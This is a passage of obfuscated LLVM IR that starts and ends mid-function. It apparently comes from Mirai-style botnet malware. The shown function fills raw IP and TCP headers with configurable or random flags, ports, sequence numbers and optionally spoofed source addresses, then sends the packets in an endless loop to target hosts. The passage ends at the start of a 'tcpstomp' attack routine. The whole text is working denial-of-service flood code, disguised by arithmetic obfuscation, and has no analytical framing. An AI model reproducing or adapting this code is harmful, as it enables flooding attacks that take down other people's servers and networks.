  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %4
  br label %633

; <label>:109:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %110 = load i32, i32* %10, align 4
  %111 = bitcast i32* %9 to i8*
  %112 = call i32 @setsockopt(i32 %110, i32 0, i32 3, i8* %111, i32 4) #6
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %117

; <label>:114:                                    ; preds = %109
  %115 = load i32, i32* %10, align 4
  %116 = call i32 @close(i32 %115)
  br label %633

; <label>:117:                                    ; preds = %109
  store i32 0, i32* %9, align 4
  br label %118

; <label>:118:                                    ; preds = %433, %117
  %119 = load i32, i32* %9, align 4
  %120 = load i8, i8* %5, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %119, %121
  br i1 %122, label %123, label %439

; <label>:123:                                    ; preds = %118
  %124 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %125 = load i8**, i8*** %11, align 8
  %126 = load i32, i32* %9, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8*, i8** %125, i64 %127
  store i8* %124, i8** %128, align 8
  %129 = load i8**, i8*** %11, align 8
  %130 = load i32, i32* %9, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8*, i8** %129, i64 %131
  %133 = load i8*, i8** %132, align 8
  %134 = bitcast i8* %133 to %struct.iphdr*
  store %struct.iphdr* %134, %struct.iphdr** %29, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i64 1
  %137 = bitcast %struct.iphdr* %136 to %struct.tcphdr*
  store %struct.tcphdr* %137, %struct.tcphdr** %30, align 8
  %138 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i64 1
  %140 = bitcast %struct.tcphdr* %139 to i8*
  store i8* %140, i8** %31, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %142 = bitcast %struct.iphdr* %141 to i8*
  %143 = load i8, i8* %142, align 4
  %144 = xor i8 %143, -1
  %145 = xor i8 15, -1
  %146 = xor i8 -106, -1
  %147 = or i8 %144, %145
  %148 = or i8 -106, %146
  %149 = xor i8 %147, -1
  %150 = and i8 %149, %148
  %151 = and i8 %143, 15
  %152 = and i8 %150, 64
  %153 = xor i8 %150, 64
  %154 = or i8 %152, %153
  %155 = or i8 %150, 64
  store i8 %154, i8* %142, align 4
  %156 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %157 = bitcast %struct.iphdr* %156 to i8*
  %158 = load i8, i8* %157, align 4
  %159 = xor i8 -16, -1
  %160 = xor i8 %158, %159
  %161 = and i8 %160, %158
  %162 = and i8 %158, -16
  %163 = and i8 %161, 5
  %164 = xor i8 %161, 5
  %165 = or i8 %163, %164
  %166 = or i8 %161, 5
  store i8 %165, i8* %157, align 4
  %167 = load i8, i8* %12, align 1
  %168 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 1
  store i8 %167, i8* %169, align 1
  %170 = load i32, i32* %26, align 4
  %171 = sext i32 %170 to i64
  %172 = add i64 40, -1734790953111485955
  %173 = add i64 %172, %171
  %174 = sub i64 %173, -1734790953111485955
  %175 = add i64 40, %171
  %176 = trunc i64 %174 to i16
  %177 = call zeroext i16 @htons(i16 zeroext %176) #7
  %178 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 2
  store i16 %177, i16* %179, align 2
  %180 = load i16, i16* %13, align 2
  %181 = call zeroext i16 @htons(i16 zeroext %180) #7
  %182 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 3
  store i16 %181, i16* %183, align 4
  %184 = load i8, i8* %14, align 1
  %185 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 5
  store i8 %184, i8* %186, align 4
  %187 = load i8, i8* %15, align 1
  %188 = icmp ne i8 %187, 0
  br i1 %188, label %189, label %193

; <label>:189:                                    ; preds = %123
  %190 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %191 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 4
  store i16 %190, i16* %192, align 2
  br label %193

; <label>:193:                                    ; preds = %189, %123
  %194 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 6
  store i8 6, i8* %195, align 1
  %196 = load i32, i32* %28, align 4
  %197 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 8
  store i32 %196, i32* %198, align 4
  %199 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %200 = load i32, i32* %9, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i64 %201
  %203 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %202, i32 0, i32 1
  %204 = load i32, i32* %203, align 4
  %205 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 9
  store i32 %204, i32* %206, align 4
  %207 = load i16, i16* %16, align 2
  %208 = call zeroext i16 @htons(i16 zeroext %207) #7
  %209 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %210 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %209, i32 0, i32 0
  store i16 %208, i16* %210, align 4
  %211 = load i16, i16* %17, align 2
  %212 = call zeroext i16 @htons(i16 zeroext %211) #7
  %213 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 1
  store i16 %212, i16* %214, align 2
  %215 = load i32, i32* %18, align 4
  %216 = trunc i32 %215 to i16
  %217 = call zeroext i16 @htons(i16 zeroext %216) #7
  %218 = zext i16 %217 to i32
  %219 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %220 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %219, i32 0, i32 2
  store i32 %218, i32* %220, align 4
  %221 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %222 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %221, i32 0, i32 4
  %223 = load i16, i16* %222, align 4
  %224 = xor i16 -241, -1
  %225 = xor i16 %223, %224
  %226 = and i16 %225, %223
  %227 = and i16 %223, -241
  %228 = xor i16 %226, -1
  %229 = xor i16 80, -1
  %230 = xor i16 -20610, -1
  %231 = and i16 %228, -20610
  %232 = and i16 %226, %230
  %233 = and i16 %229, -20610
  %234 = and i16 80, %230
  %235 = or i16 %231, %232
  %236 = or i16 %233, %234
  %237 = xor i16 %235, %236
  %238 = or i16 %228, %229
  %239 = xor i16 %238, -1
  %240 = or i16 -20610, %230
  %241 = and i16 %239, %240
  %242 = or i16 %237, %241
  %243 = or i16 %226, 80
  store i16 %242, i16* %222, align 4
  %244 = load i8, i8* %20, align 1
  %245 = sext i8 %244 to i16
  %246 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %247 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %246, i32 0, i32 4
  %248 = load i16, i16* %247, align 4
  %249 = xor i16 1, -1
  %250 = xor i16 %245, %249
  %251 = and i16 %250, %245
  %252 = and i16 %245, 1
  %253 = shl i16 %251, 13
  %254 = xor i16 %248, -1
  %255 = xor i16 -8193, -1
  %256 = xor i16 -15829, -1
  %257 = or i16 %254, %255
  %258 = or i16 -15829, %256
  %259 = xor i16 %257, -1
  %260 = and i16 %259, %258
  %261 = and i16 %248, -8193
  %262 = and i16 %260, %253
  %263 = xor i16 %260, %253
  %264 = or i16 %262, %263
  %265 = or i16 %260, %253
  store i16 %264, i16* %247, align 4
  %266 = load i8, i8* %21, align 1
  %267 = sext i8 %266 to i16
  %268 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %269 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %268, i32 0, i32 4
  %270 = load i16, i16* %269, align 4
  %271 = xor i16 %267, -1
  %272 = xor i16 1, -1
  %273 = xor i16 -29189, -1
  %274 = or i16 %271, %272
  %275 = or i16 -29189, %273
  %276 = xor i16 %274, -1
  %277 = and i16 %276, %275
  %278 = and i16 %267, 1
  %279 = shl i16 %277, 12
  %280 = xor i16 -4097, -1
  %281 = xor i16 %270, %280
  %282 = and i16 %281, %270
  %283 = and i16 %270, -4097
  %284 = xor i16 %282, -1
  %285 = xor i16 %279, -1
  %286 = xor i16 -9003, -1
  %287 = and i16 %284, -9003
  %288 = and i16 %282, %286
  %289 = and i16 %285, -9003
  %290 = and i16 %279, %286
  %291 = or i16 %287, %288
  %292 = or i16 %289, %290
  %293 = xor i16 %291, %292
  %294 = or i16 %284, %285
  %295 = xor i16 %294, -1
  %296 = or i16 -9003, %286
  %297 = and i16 %295, %296
  %298 = or i16 %293, %297
  %299 = or i16 %282, %279
  store i16 %298, i16* %269, align 4
  %300 = load i8, i8* %22, align 1
  %301 = sext i8 %300 to i16
  %302 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i32 0, i32 4
  %304 = load i16, i16* %303, align 4
  %305 = xor i16 %301, -1
  %306 = xor i16 1, -1
  %307 = xor i16 -1583, -1
  %308 = or i16 %305, %306
  %309 = or i16 -1583, %307
  %310 = xor i16 %308, -1
  %311 = and i16 %310, %309
  %312 = and i16 %301, 1
  %313 = shl i16 %311, 11
  %314 = xor i16 %304, -1
  %315 = xor i16 -2049, -1
  %316 = xor i16 17818, -1
  %317 = or i16 %314, %315
  %318 = or i16 17818, %316
  %319 = xor i16 %317, -1
  %320 = and i16 %319, %318
  %321 = and i16 %304, -2049
  %322 = and i16 %320, %313
  %323 = xor i16 %320, %313
  %324 = or i16 %322, %323
  %325 = or i16 %320, %313
  store i16 %324, i16* %303, align 4
  %326 = load i8, i8* %23, align 1
  %327 = sext i8 %326 to i16
  %328 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %329 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %328, i32 0, i32 4
  %330 = load i16, i16* %329, align 4
  %331 = xor i16 1, -1
  %332 = xor i16 %327, %331
  %333 = and i16 %332, %327
  %334 = and i16 %327, 1
  %335 = shl i16 %333, 10
  %336 = xor i16 -1025, -1
  %337 = xor i16 %330, %336
  %338 = and i16 %337, %330
  %339 = and i16 %330, -1025
  %340 = and i16 %338, %335
  %341 = xor i16 %338, %335
  %342 = or i16 %340, %341
  %343 = or i16 %338, %335
  store i16 %342, i16* %329, align 4
  %344 = load i8, i8* %24, align 1
  %345 = sext i8 %344 to i16
  %346 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %347 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %346, i32 0, i32 4
  %348 = load i16, i16* %347, align 4
  %349 = xor i16 1, -1
  %350 = xor i16 %345, %349
  %351 = and i16 %350, %345
  %352 = and i16 %345, 1
  %353 = shl i16 %351, 9
  %354 = xor i16 -513, -1
  %355 = xor i16 %348, %354
  %356 = and i16 %355, %348
  %357 = and i16 %348, -513
  %358 = xor i16 %356, -1
  %359 = xor i16 %353, -1
  %360 = xor i16 -17921, -1
  %361 = and i16 %358, -17921
  %362 = and i16 %356, %360
  %363 = and i16 %359, -17921
  %364 = and i16 %353, %360
  %365 = or i16 %361, %362
  %366 = or i16 %363, %364
  %367 = xor i16 %365, %366
  %368 = or i16 %358, %359
  %369 = xor i16 %368, -1
  %370 = or i16 -17921, %360
  %371 = and i16 %369, %370
  %372 = or i16 %367, %371
  %373 = or i16 %356, %353
  store i16 %372, i16* %347, align 4
  %374 = load i8, i8* %25, align 1
  %375 = sext i8 %374 to i16
  %376 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %377 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %376, i32 0, i32 4
  %378 = load i16, i16* %377, align 4
  %379 = xor i16 1, -1
  %380 = xor i16 %375, %379
  %381 = and i16 %380, %375
  %382 = and i16 %375, 1
  %383 = shl i16 %381, 8
  %384 = xor i16 -257, -1
  %385 = xor i16 %378, %384
  %386 = and i16 %385, %378
  %387 = and i16 %378, -257
  %388 = and i16 %386, %383
  %389 = xor i16 %386, %383
  %390 = or i16 %388, %389
  %391 = or i16 %386, %383
  store i16 %390, i16* %377, align 4
  %392 = call i32 @rand_next()
  %393 = xor i32 %392, -1
  %394 = xor i32 65535, -1
  %395 = xor i32 1980318127, -1
  %396 = or i32 %393, %394
  %397 = or i32 1980318127, %395
  %398 = xor i32 %396, -1
  %399 = and i32 %398, %397
  %400 = and i32 %392, 65535
  %401 = trunc i32 %399 to i16
  %402 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %403 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %402, i32 0, i32 5
  store i16 %401, i16* %403, align 2
  %404 = load i8, i8* %22, align 1
  %405 = icmp ne i8 %404, 0
  br i1 %405, label %406, label %430

; <label>:406:                                    ; preds = %193
  %407 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %408 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %407, i32 0, i32 4
  %409 = load i16, i16* %408, align 4
  %410 = xor i16 -2049, -1
  %411 = xor i16 %409, %410
  %412 = and i16 %411, %409
  %413 = and i16 %409, -2049
  %414 = xor i16 %412, -1
  %415 = xor i16 2048, -1
  %416 = xor i16 18738, -1
  %417 = and i16 %414, 18738
  %418 = and i16 %412, %416
  %419 = and i16 %415, 18738
  %420 = and i16 2048, %416
  %421 = or i16 %417, %418
  %422 = or i16 %419, %420
  %423 = xor i16 %421, %422
  %424 = or i16 %414, %415
  %425 = xor i16 %424, -1
  %426 = or i16 18738, %416
  %427 = and i16 %425, %426
  %428 = or i16 %423, %427
  %429 = or i16 %412, 2048
  store i16 %428, i16* %408, align 4
  br label %430

; <label>:430:                                    ; preds = %406, %193
  %431 = load i8*, i8** %31, align 8
  %432 = load i32, i32* %26, align 4
  call void @rand_str(i8* %431, i32 %432)
  br label %433

; <label>:433:                                    ; preds = %430
  %434 = load i32, i32* %9, align 4
  %435 = sub i32 %434, 898980674
  %436 = add i32 %435, 1
  %437 = add i32 %436, 898980674
  %438 = add nsw i32 %434, 1
  store i32 %437, i32* %9, align 4
  br label %118

; <label>:439:                                    ; preds = %118
  br label %440

; <label>:440:                                    ; preds = %632, %439
  store i32 0, i32* %9, align 4
  br label %441

; <label>:441:                                    ; preds = %625, %440
  %442 = load i32, i32* %9, align 4
  %443 = load i8, i8* %5, align 1
  %444 = zext i8 %443 to i32
  %445 = icmp slt i32 %442, %444
  br i1 %445, label %446, label %632

; <label>:446:                                    ; preds = %441
  %447 = load i8**, i8*** %11, align 8
  %448 = load i32, i32* %9, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds i8*, i8** %447, i64 %449
  %451 = load i8*, i8** %450, align 8
  store i8* %451, i8** %32, align 8
  %452 = load i8*, i8** %32, align 8
  %453 = bitcast i8* %452 to %struct.iphdr*
  store %struct.iphdr* %453, %struct.iphdr** %33, align 8
  %454 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %455 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %454, i64 1
  %456 = bitcast %struct.iphdr* %455 to %struct.tcphdr*
  store %struct.tcphdr* %456, %struct.tcphdr** %34, align 8
  %457 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %458 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %457, i64 1
  %459 = bitcast %struct.tcphdr* %458 to i8*
  store i8* %459, i8** %35, align 8
  %460 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %461 = load i32, i32* %9, align 4
  %462 = sext i32 %461 to i64
  %463 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %460, i64 %462
  %464 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %463, i32 0, i32 2
  %465 = load i8, i8* %464, align 4
  %466 = zext i8 %465 to i32
  %467 = icmp slt i32 %466, 32
  br i1 %467, label %468, label %493

; <label>:468:                                    ; preds = %446
  %469 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %470 = load i32, i32* %9, align 4
  %471 = sext i32 %470 to i64
  %472 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %469, i64 %471
  %473 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %472, i32 0, i32 1
  %474 = load i32, i32* %473, align 4
  %475 = call i32 @ntohl(i32 %474) #7
  %476 = call i32 @rand_next()
  %477 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %478 = load i32, i32* %9, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %477, i64 %479
  %481 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %480, i32 0, i32 2
  %482 = load i8, i8* %481, align 4
  %483 = zext i8 %482 to i32
  %484 = lshr i32 %476, %483
  %485 = sub i32 0, %475
  %486 = sub i32 0, %484
  %487 = add i32 %485, %486
  %488 = sub i32 0, %487
  %489 = add i32 %475, %484
  %490 = call i32 @htonl(i32 %488) #7
  %491 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %492 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %491, i32 0, i32 9
  store i32 %490, i32* %492, align 4
  br label %493

; <label>:493:                                    ; preds = %468, %446
  %494 = load i32, i32* %28, align 4
  %495 = icmp eq i32 %494, -1
  br i1 %495, label %496, label %500

; <label>:496:                                    ; preds = %493
  %497 = call i32 @rand_next()
  %498 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %499 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %498, i32 0, i32 8
  store i32 %497, i32* %499, align 4
  br label %500

; <label>:500:                                    ; preds = %496, %493
  %501 = load i16, i16* %13, align 2
  %502 = zext i16 %501 to i32
  %503 = icmp eq i32 %502, 65535
  br i1 %503, label %504, label %517

; <label>:504:                                    ; preds = %500
  %505 = call i32 @rand_next()
  %506 = xor i32 %505, -1
  %507 = xor i32 65535, -1
  %508 = xor i32 -370872044, -1
  %509 = or i32 %506, %507
  %510 = or i32 -370872044, %508
  %511 = xor i32 %509, -1
  %512 = and i32 %511, %510
  %513 = and i32 %505, 65535
  %514 = trunc i32 %512 to i16
  %515 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %516 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %515, i32 0, i32 3
  store i16 %514, i16* %516, align 4
  br label %517

; <label>:517:                                    ; preds = %504, %500
  %518 = load i16, i16* %16, align 2
  %519 = zext i16 %518 to i32
  %520 = icmp eq i32 %519, 65535
  br i1 %520, label %521, label %530

; <label>:521:                                    ; preds = %517
  %522 = call i32 @rand_next()
  %523 = xor i32 65535, -1
  %524 = xor i32 %522, %523
  %525 = and i32 %524, %522
  %526 = and i32 %522, 65535
  %527 = trunc i32 %525 to i16
  %528 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %529 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %528, i32 0, i32 0
  store i16 %527, i16* %529, align 4
  br label %530

; <label>:530:                                    ; preds = %521, %517
  %531 = load i16, i16* %17, align 2
  %532 = zext i16 %531 to i32
  %533 = icmp eq i32 %532, 65535
  br i1 %533, label %534, label %547

; <label>:534:                                    ; preds = %530
  %535 = call i32 @rand_next()
  %536 = xor i32 %535, -1
  %537 = xor i32 65535, -1
  %538 = xor i32 1345964977, -1
  %539 = or i32 %536, %537
  %540 = or i32 1345964977, %538
  %541 = xor i32 %539, -1
  %542 = and i32 %541, %540
  %543 = and i32 %535, 65535
  %544 = trunc i32 %542 to i16
  %545 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %546 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %545, i32 0, i32 1
  store i16 %544, i16* %546, align 2
  br label %547

; <label>:547:                                    ; preds = %534, %530
  %548 = load i32, i32* %18, align 4
  %549 = icmp eq i32 %548, 65535
  br i1 %549, label %550, label %554

; <label>:550:                                    ; preds = %547
  %551 = call i32 @rand_next()
  %552 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %553 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %552, i32 0, i32 2
  store i32 %551, i32* %553, align 4
  br label %554

; <label>:554:                                    ; preds = %550, %547
  %555 = load i32, i32* %19, align 4
  %556 = icmp eq i32 %555, 65535
  br i1 %556, label %557, label %561

; <label>:557:                                    ; preds = %554
  %558 = call i32 @rand_next()
  %559 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %560 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %559, i32 0, i32 3
  store i32 %558, i32* %560, align 4
  br label %561

; <label>:561:                                    ; preds = %557, %554
  %562 = load i8, i8* %27, align 1
  %563 = icmp ne i8 %562, 0
  br i1 %563, label %564, label %567

; <label>:564:                                    ; preds = %561
  %565 = load i8*, i8** %35, align 8
  %566 = load i32, i32* %26, align 4
  call void @rand_str(i8* %565, i32 %566)
  br label %567

; <label>:567:                                    ; preds = %564, %561
  %568 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %569 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %568, i32 0, i32 7
  store i16 0, i16* %569, align 2
  %570 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %571 = bitcast %struct.iphdr* %570 to i16*
  %572 = call zeroext i16 @checksum_generic(i16* %571, i32 20)
  %573 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %574 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %573, i32 0, i32 7
  store i16 %572, i16* %574, align 2
  %575 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %576 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %575, i32 0, i32 6
  store i16 0, i16* %576, align 4
  %577 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %578 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %579 = bitcast %struct.tcphdr* %578 to i8*
  %580 = load i32, i32* %26, align 4
  %581 = sext i32 %580 to i64
  %582 = sub i64 0, %581
  %583 = sub i64 20, %582
  %584 = add i64 20, %581
  %585 = trunc i64 %583 to i16
  %586 = call zeroext i16 @htons(i16 zeroext %585) #7
  %587 = load i32, i32* %26, align 4
  %588 = sext i32 %587 to i64
  %589 = sub i64 0, 20
  %590 = sub i64 0, %588
  %591 = add i64 %589, %590
  %592 = sub i64 0, %591
  %593 = add i64 20, %588
  %594 = trunc i64 %592 to i32
  %595 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %577, i8* %579, i16 zeroext %586, i32 %594)
  %596 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %597 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %596, i32 0, i32 6
  store i16 %595, i16* %597, align 4
  %598 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %599 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %598, i32 0, i32 1
  %600 = load i16, i16* %599, align 2
  %601 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %602 = load i32, i32* %9, align 4
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %601, i64 %603
  %605 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %604, i32 0, i32 0
  %606 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %605, i32 0, i32 1
  store i16 %600, i16* %606, align 2
  %607 = load i32, i32* %10, align 4
  %608 = load i8*, i8** %32, align 8
  %609 = load i32, i32* %26, align 4
  %610 = sext i32 %609 to i64
  %611 = add i64 40, 350691269170083694
  %612 = add i64 %611, %610
  %613 = sub i64 %612, 350691269170083694
  %614 = add i64 40, %610
  %615 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %616 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %617 = load i32, i32* %9, align 4
  %618 = sext i32 %617 to i64
  %619 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %616, i64 %618
  %620 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %619, i32 0, i32 0
  %621 = bitcast %struct.sockaddr_in* %620 to %struct.sockaddr*
  store %struct.sockaddr* %621, %struct.sockaddr** %615, align 8
  %622 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %623 = load %struct.sockaddr*, %struct.sockaddr** %622, align 8
  %624 = call i64 @sendto(i32 %607, i8* %608, i64 %613, i32 16384, %struct.sockaddr* %623, i32 16)
  br label %625

; <label>:625:                                    ; preds = %567
  %626 = load i32, i32* %9, align 4
  %627 = sub i32 0, %626
  %628 = sub i32 0, 1
  %629 = add i32 %627, %628
  %630 = sub i32 0, %629
  %631 = add nsw i32 %626, 1
  store i32 %630, i32* %9, align 4
  br label %441

; <label>:632:                                    ; preds = %441
  br label %440

; <label>:633:                                    ; preds = %114, %108
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
